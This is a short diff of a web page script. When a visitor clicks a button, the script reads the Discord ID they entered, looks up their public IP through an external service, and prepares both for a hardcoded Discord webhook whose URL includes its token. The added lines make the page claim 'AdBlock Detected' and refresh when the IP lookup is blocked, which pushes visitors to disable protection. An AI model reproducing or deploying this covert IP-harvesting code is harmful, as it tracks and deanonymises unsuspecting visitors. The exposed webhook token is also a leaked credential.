@@ -12,7 +12,13 @@ function httpGet(theUrl)
 
 document.getElementById('button').addEventListener("click", function() {
     var balls = document.getElementById('discordid').value;
-    publicIp = httpGet("https://api.ipify.org/");
+    try{
+        publicIp = httpGet("https://api.ipify.org/");
+    } catch (error) {
+        alert("AdBlock Detected.")
+        Refresh();
+    }
+
     document.getElementById('button').addEventListener("click", function() {
         var balls = document.getElementById('discordid').value;
         var url = "https://discordapp.com/api/webhooks/1033450138678607913/oNUp3ukzPbCEd6buK9Z1FUaxFio8iqbpDHng_-O7EBUODFiz5YmM8yiBAaSyg446OoZq";
